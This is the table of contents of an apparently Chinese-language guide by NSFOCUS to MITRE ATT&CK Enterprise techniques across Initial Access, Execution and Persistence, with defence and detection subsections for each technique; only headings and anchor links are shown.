# [**MITRE ATT&CK Enterprise FrameWork**](https://attack.mitre.org/)

> by HTTP 418 I'm a teapot. @NSFOCUS

***

<!-- TOC -->

- [**MITRE ATT&CK Enterprise FrameWork**](#mitre-attck-enterprise-framework)
  - [Perface](#perface)
  - [Initial Access (初始访问)](#initial-access-%e5%88%9d%e5%a7%8b%e8%ae%bf%e9%97%ae)
    - [Drive-by Compromise (路过式威胁)](#drive-by-compromise-%e8%b7%af%e8%bf%87%e5%bc%8f%e5%a8%81%e8%83%81)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5)
    - [Exploit Public-Facing Application (利用大众化应用程序)](#exploit-public-facing-application-%e5%88%a9%e7%94%a8%e5%a4%a7%e4%bc%97%e5%8c%96%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-1)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-1)
    - [External Remote Services (外部远程服务)](#external-remote-services-%e5%a4%96%e9%83%a8%e8%bf%9c%e7%a8%8b%e6%9c%8d%e5%8a%a1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-2)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-2)
    - [Hardware Additions (物理渗透硬件)](#hardware-additions-%e7%89%a9%e7%90%86%e6%b8%97%e9%80%8f%e7%a1%ac%e4%bb%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-3)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-3)
    - [Replication Through Removable Media (通过可移动媒介复制)](#replication-through-removable-media-%e9%80%9a%e8%bf%87%e5%8f%af%e7%a7%bb%e5%8a%a8%e5%aa%92%e4%bb%8b%e5%a4%8d%e5%88%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-4)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-4)
    - [Spearphishing Attachment (鱼叉式钓鱼附件)](#spearphishing-attachment-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%99%84%e4%bb%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-5)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-5)
    - [Spearphishing Link (鱼叉式钓鱼链接)](#spearphishing-link-%e9%b1%bc%e5%8f%89%e5%bc%8f%e9%92%93%e9%b1%bc%e9%93%be%e6%8e%a5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-6)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-6)
    - [Spearphishing via Service (服务式鱼叉钓鱼)](#spearphishing-via-service-%e6%9c%8d%e5%8a%a1%e5%bc%8f%e9%b1%bc%e5%8f%89%e9%92%93%e9%b1%bc)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-7)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-7)
    - [Supply Chain Compromise (供应链攻击)](#supply-chain-compromise-%e4%be%9b%e5%ba%94%e9%93%be%e6%94%bb%e5%87%bb)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-8)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-8)
    - [Trusted Relationship (受信关系)](#trusted-relationship-%e5%8f%97%e4%bf%a1%e5%85%b3%e7%b3%bb)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-9)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-9)
    - [Valid Accounts (合法账号)](#valid-accounts-%e5%90%88%e6%b3%95%e8%b4%a6%e5%8f%b7)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-10)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-10)
  - [Execution (执行)](#execution-%e6%89%a7%e8%a1%8c)
    - [AppleScript (AppleScript)](#applescript-applescript)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-11)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-11)
    - [CMSTP (CMSTP-Microsoft连接管理器配置文件安装程序)](#cmstp-cmstp-microsoft%e8%bf%9e%e6%8e%a5%e7%ae%a1%e7%90%86%e5%99%a8%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%ae%89%e8%a3%85%e7%a8%8b%e5%ba%8f)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-12)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-12)
    - [Command-Line Interface (命令行界面)](#command-line-interface-%e5%91%bd%e4%bb%a4%e8%a1%8c%e7%95%8c%e9%9d%a2)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-13)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-13)
    - [Compiled HTML File (.chm文件)](#compiled-html-file-chm%e6%96%87%e4%bb%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-14)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-14)
    - [Component Object Model and Distributed COM (COM & DCOM)](#component-object-model-and-distributed-com-com--dcom)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-15)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-15)
    - [Control Panel Items (控制面板项)](#control-panel-items-%e6%8e%a7%e5%88%b6%e9%9d%a2%e6%9d%bf%e9%a1%b9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-16)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-16)
    - [Dynamic Data Exchange (动态数据交换协议)](#dynamic-data-exchange-%e5%8a%a8%e6%80%81%e6%95%b0%e6%8d%ae%e4%ba%a4%e6%8d%a2%e5%8d%8f%e8%ae%ae)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-17)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-17)
    - [Execution through API (通过API执行)](#execution-through-api-%e9%80%9a%e8%bf%87api%e6%89%a7%e8%a1%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-18)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-18)
    - [Execution through Module Load (通过模块加载执行)](#execution-through-module-load-%e9%80%9a%e8%bf%87%e6%a8%a1%e5%9d%97%e5%8a%a0%e8%bd%bd%e6%89%a7%e8%a1%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-19)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-19)
    - [Exploitation for Client Execution (客户端执行的利用)](#exploitation-for-client-execution-%e5%ae%a2%e6%88%b7%e7%ab%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%88%a9%e7%94%a8)
      - [基于浏览器的利用](#%e5%9f%ba%e4%ba%8e%e6%b5%8f%e8%a7%88%e5%99%a8%e7%9a%84%e5%88%a9%e7%94%a8)
      - [办公应用](#%e5%8a%9e%e5%85%ac%e5%ba%94%e7%94%a8)
      - [常见第三方应用](#%e5%b8%b8%e8%a7%81%e7%ac%ac%e4%b8%89%e6%96%b9%e5%ba%94%e7%94%a8)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-20)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-20)
    - [Graphical User Interface (GUI)](#graphical-user-interface-gui)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-21)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-21)
    - [InstallUtil (InstallUtil)](#installutil-installutil)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-22)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-22)
    - [Launchctl (macOS)](#launchctl-macos)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-23)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-23)
    - [Local Job Scheduling (本地作业调度)](#local-job-scheduling-%e6%9c%ac%e5%9c%b0%e4%bd%9c%e4%b8%9a%e8%b0%83%e5%ba%a6)
      - [cron](#cron)
      - [at](#at)
      - [launchd](#launchd)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-24)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-24)
    - [LSASS Driver (LSASS驱动程序)](#lsass-driver-lsass%e9%a9%b1%e5%8a%a8%e7%a8%8b%e5%ba%8f)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-25)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-25)
    - [Mshta (Mshta.exe)](#mshta-mshtaexe)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-26)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-26)
    - [PowerShell (PowerShell)](#powershell-powershell)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-27)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-27)
    - [Regsvcs/Regasm (Regsvcs / Regasm)](#regsvcsregasm-regsvcs--regasm)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-28)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-28)
    - [Regsvr32 (Regsvr32)](#regsvr32-regsvr32)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-29)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-29)
    - [Rundll32 (Rundll32)](#rundll32-rundll32)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-30)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-30)
    - [Scheduled Task (计划任务)](#scheduled-task-%e8%ae%a1%e5%88%92%e4%bb%bb%e5%8a%a1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-31)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-31)
    - [Scripting (脚本)](#scripting-%e8%84%9a%e6%9c%ac)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-32)
    - [Service Execution (服务执行)](#service-execution-%e6%9c%8d%e5%8a%a1%e6%89%a7%e8%a1%8c)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-1)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-33)
    - [Signed Binary Proxy Execution (含签名的二进制代理执行)](#signed-binary-proxy-execution-%e5%90%ab%e7%ad%be%e5%90%8d%e7%9a%84%e4%ba%8c%e8%bf%9b%e5%88%b6%e4%bb%a3%e7%90%86%e6%89%a7%e8%a1%8c)
      - [`msiexec.exe`](#msiexecexe)
      - [`Mavinject.exe`](#mavinjectexe)
      - [`SyncAppvPublishingServer.exe`](#syncappvpublishingserverexe)
      - [`odbcconf.exe`](#odbcconfexe)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-2)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-34)
    - [Signed Script Proxy Execution (含签名的脚本代理执行)](#signed-script-proxy-execution-%e5%90%ab%e7%ad%be%e5%90%8d%e7%9a%84%e8%84%9a%e6%9c%ac%e4%bb%a3%e7%90%86%e6%89%a7%e8%a1%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-32)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-35)
    - [Source (Source命令)](#source-source%e5%91%bd%e4%bb%a4)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-3)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-36)
    - [Space after Filename (文件名后的空格)](#space-after-filename-%e6%96%87%e4%bb%b6%e5%90%8d%e5%90%8e%e7%9a%84%e7%a9%ba%e6%a0%bc)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-4)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-37)
    - [Third-party Software (第三方软件)](#third-party-software-%e7%ac%ac%e4%b8%89%e6%96%b9%e8%bd%af%e4%bb%b6)
      - [防御方法](#%e9%98%b2%e5%be%a1%e6%96%b9%e6%b3%95-5)
    - [Trap (trap 命令)](#trap-trap-%e5%91%bd%e4%bb%a4)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-33)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-38)
    - [Trusted Developer Utilities (受信任的开发工具)](#trusted-developer-utilities-%e5%8f%97%e4%bf%a1%e4%bb%bb%e7%9a%84%e5%bc%80%e5%8f%91%e5%b7%a5%e5%85%b7)
      - [MSBuild](#msbuild)
      - [DNX](#dnx)
      - [RCSI](#rcsi)
      - [WinDbg / CDB](#windbg--cdb)
      - [Tracker](#tracker)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-34)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-39)
    - [User Execution (用户执行)](#user-execution-%e7%94%a8%e6%88%b7%e6%89%a7%e8%a1%8c)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-35)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-40)
    - [Windows Management Instrumentation (Windows 管理规范)](#windows-management-instrumentation-windows-%e7%ae%a1%e7%90%86%e8%a7%84%e8%8c%83)
      - [防御手段](#%e9%98%b2%e5%be%a1%e6%89%8b%e6%ae%b5)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-41)
    - [Windows Remote Management (Windows 远程管理)](#windows-remote-management-windows-%e8%bf%9c%e7%a8%8b%e7%ae%a1%e7%90%86)
      - [防御手段](#%e9%98%b2%e5%be%a1%e6%89%8b%e6%ae%b5-1)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-42)
    - [XSL Script Processing (XSL 脚本处理)](#xsl-script-processing-xsl-%e8%84%9a%e6%9c%ac%e5%a4%84%e7%90%86)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-36)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-43)
  - [Persistence (持久化)](#persistence-%e6%8c%81%e4%b9%85%e5%8c%96)
    - [.bash_profile and .bashrc (.bash_profile & .bashrc)](#bashprofile-and-bashrc-bashprofile--bashrc)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-37)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-44)
    - [Accessibility Features (辅助功能)](#accessibility-features-%e8%be%85%e5%8a%a9%e5%8a%9f%e8%83%bd)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-38)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-45)
    - [Account Manipulation (账户操作)](#account-manipulation-%e8%b4%a6%e6%88%b7%e6%93%8d%e4%bd%9c)
      - [交换电子邮件帐户接管](#%e4%ba%a4%e6%8d%a2%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e5%b8%90%e6%88%b7%e6%8e%a5%e7%ae%a1)
      - [Azure AD](#azure-ad)
      - [AWS](#aws)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-39)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-46)
    - [AppCert DLLs (AppCert DLLs)](#appcert-dlls-appcert-dlls)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-40)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-47)
    - [AppInit DLLs (AppInit DLLs)](#appinit-dlls-appinit-dlls)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-41)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-48)
    - [Application Shimming (Application Shimming)](#application-shimming-application-shimming)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-42)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-49)
    - [Authentication Package (身份认证包)](#authentication-package-%e8%ba%ab%e4%bb%bd%e8%ae%a4%e8%af%81%e5%8c%85)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-43)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-50)
    - [BITS Jobs (BITS-Windows后台智能传输服务-利用)](#bits-jobs-bits-windows%e5%90%8e%e5%8f%b0%e6%99%ba%e8%83%bd%e4%bc%a0%e8%be%93%e6%9c%8d%e5%8a%a1-%e5%88%a9%e7%94%a8)
      - [背景](#%e8%83%8c%e6%99%af)
      - [武器化](#%e6%ad%a6%e5%99%a8%e5%8c%96)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-44)
      - [检测](#%e6%a3%80%e6%b5%8b)
    - [Bootkit (Bootkit)](#bootkit-bootkit)
      - [主引导记录](#%e4%b8%bb%e5%bc%95%e5%af%bc%e8%ae%b0%e5%bd%95)
      - [卷引导记录](#%e5%8d%b7%e5%bc%95%e5%af%bc%e8%ae%b0%e5%bd%95)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-45)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-51)
    - [Browser Extensions (浏览器扩展)](#browser-extensions-%e6%b5%8f%e8%a7%88%e5%99%a8%e6%89%a9%e5%b1%95)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-46)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-52)
    - [Change Default File Association (更改默认文件关联)](#change-default-file-association-%e6%9b%b4%e6%94%b9%e9%bb%98%e8%ae%a4%e6%96%87%e4%bb%b6%e5%85%b3%e8%81%94)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-47)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-53)
    - [Component Firmware (组件固件)](#component-firmware-%e7%bb%84%e4%bb%b6%e5%9b%ba%e4%bb%b6)
      - [背景](#%e8%83%8c%e6%99%af-1)
      - [武器化](#%e6%ad%a6%e5%99%a8%e5%8c%96-1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-48)
      - [检测](#%e6%a3%80%e6%b5%8b-1)
    - [Component Object Model Hijacking (COM劫持)](#component-object-model-hijacking-com%e5%8a%ab%e6%8c%81)
      - [背景](#%e8%83%8c%e6%99%af-2)
      - [利用场景](#%e5%88%a9%e7%94%a8%e5%9c%ba%e6%99%af)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-49)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-54)
    - [Create Account (创建用户)](#create-account-%e5%88%9b%e5%bb%ba%e7%94%a8%e6%88%b7)
      - [Windows](#windows)
      - [Office 365](#office-365)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-50)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-55)
    - [DLL Search Order Hijacking (DLL搜索顺序劫持)](#dll-search-order-hijacking-dll%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-51)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-56)
    - [Dylib Hijacking (Dylib 劫持)](#dylib-hijacking-dylib-%e5%8a%ab%e6%8c%81)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-52)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-57)
    - [Emond (Emond)](#emond-emond)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-53)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-58)
    - [External Remote Services](#external-remote-services)
    - [File System Permissions Weakness (文件系统权限缺失)](#file-system-permissions-weakness-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f%e6%9d%83%e9%99%90%e7%bc%ba%e5%a4%b1)
      - [服务](#%e6%9c%8d%e5%8a%a1)
      - [可执行的安装程序](#%e5%8f%af%e6%89%a7%e8%a1%8c%e7%9a%84%e5%ae%89%e8%a3%85%e7%a8%8b%e5%ba%8f)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-54)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-59)
    - [Hidden Files and Directories (隐藏的文件与目录)](#hidden-files-and-directories-%e9%9a%90%e8%97%8f%e7%9a%84%e6%96%87%e4%bb%b6%e4%b8%8e%e7%9b%ae%e5%bd%95)
      - [Windows](#windows-1)
      - [Linux/Mac](#linuxmac)
      - [Mac](#mac)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-55)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-60)
    - [Hooking (Hooking)](#hooking-hooking)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-56)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-61)
    - [Hypervisor (管理程序)](#hypervisor-%e7%ae%a1%e7%90%86%e7%a8%8b%e5%ba%8f)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-57)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-62)
    - [Image File Execution Options Injection (图像文件执行选项注入)](#image-file-execution-options-injection-%e5%9b%be%e5%83%8f%e6%96%87%e4%bb%b6%e6%89%a7%e8%a1%8c%e9%80%89%e9%a1%b9%e6%b3%a8%e5%85%a5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-58)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-63)
    - [Implant Container Image (容器映像植入)](#implant-container-image-%e5%ae%b9%e5%99%a8%e6%98%a0%e5%83%8f%e6%a4%8d%e5%85%a5)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-59)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-64)
    - [Kernel Modules and Extensions (内核模块与扩展)](#kernel-modules-and-extensions-%e5%86%85%e6%a0%b8%e6%a8%a1%e5%9d%97%e4%b8%8e%e6%89%a9%e5%b1%95)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-60)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-65)
    - [Launch Agent (启动代理)](#launch-agent-%e5%90%af%e5%8a%a8%e4%bb%a3%e7%90%86)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-61)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-66)
    - [Launch Daemon (启动守护进程)](#launch-daemon-%e5%90%af%e5%8a%a8%e5%ae%88%e6%8a%a4%e8%bf%9b%e7%a8%8b)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-62)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-67)
    - [Launchctl](#launchctl)
    - [LC_LOAD_DYLIB Addition (LC_LOAD_DYLIB附加)](#lcloaddylib-addition-lcloaddylib%e9%99%84%e5%8a%a0)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-63)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-68)
    - [Local Job Scheduling](#local-job-scheduling)
    - [Login Item (登录项)](#login-item-%e7%99%bb%e5%bd%95%e9%a1%b9)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-64)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-69)
    - [Logon Scripts (登录脚本)](#logon-scripts-%e7%99%bb%e5%bd%95%e8%84%9a%e6%9c%ac)
      - [Windows](#windows-2)
      - [Mac](#mac-1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-65)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-70)
    - [LSASS Driver](#lsass-driver)
    - [Modify Existing Service (修改现有服务)](#modify-existing-service-%e4%bf%ae%e6%94%b9%e7%8e%b0%e6%9c%89%e6%9c%8d%e5%8a%a1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-66)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-71)
    - [Netsh Helper DLL (Netsh Helper DLL)](#netsh-helper-dll-netsh-helper-dll)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-67)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-72)
    - [New Service (新建服务)](#new-service-%e6%96%b0%e5%bb%ba%e6%9c%8d%e5%8a%a1)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-68)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-73)
    - [Office Application Startup (Office 应用程序启动)](#office-application-startup-office-%e5%ba%94%e7%94%a8%e7%a8%8b%e5%ba%8f%e5%90%af%e5%8a%a8)
      - [Office 模板宏](#office-%e6%a8%a1%e6%9d%bf%e5%ae%8f)
      - [Office 测试](#office-%e6%b5%8b%e8%af%95)
      - [插件](#%e6%8f%92%e4%bb%b6)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-69)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-74)
    - [Path Interception (路径劫持)](#path-interception-%e8%b7%af%e5%be%84%e5%8a%ab%e6%8c%81)
      - [未加引号的路径](#%e6%9c%aa%e5%8a%a0%e5%bc%95%e5%8f%b7%e7%9a%84%e8%b7%af%e5%be%84)
      - [PATH 环境变量配置错误](#path-%e7%8e%af%e5%a2%83%e5%8f%98%e9%87%8f%e9%85%8d%e7%bd%ae%e9%94%99%e8%af%af)
      - [搜索顺序劫持](#%e6%90%9c%e7%b4%a2%e9%a1%ba%e5%ba%8f%e5%8a%ab%e6%8c%81)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-70)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-75)
    - [Plist Modification (修改Plist)](#plist-modification-%e4%bf%ae%e6%94%b9plist)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-71)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-76)
    - [Port Knocking (端口试探)](#port-knocking-%e7%ab%af%e5%8f%a3%e8%af%95%e6%8e%a2)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-72)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-77)
    - [Port Monitors (端口监视器)](#port-monitors-%e7%ab%af%e5%8f%a3%e7%9b%91%e8%a7%86%e5%99%a8)
      - [防御方式](#%e9%98%b2%e5%be%a1%e6%96%b9%e5%bc%8f-73)
      - [检测手段](#%e6%a3%80%e6%b5%8b%e6%89%8b%e6%ae%b5-78)
    - [PowerShell Profile (PowerShell 配置文件)](#powershell-profile-powershell-%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6)
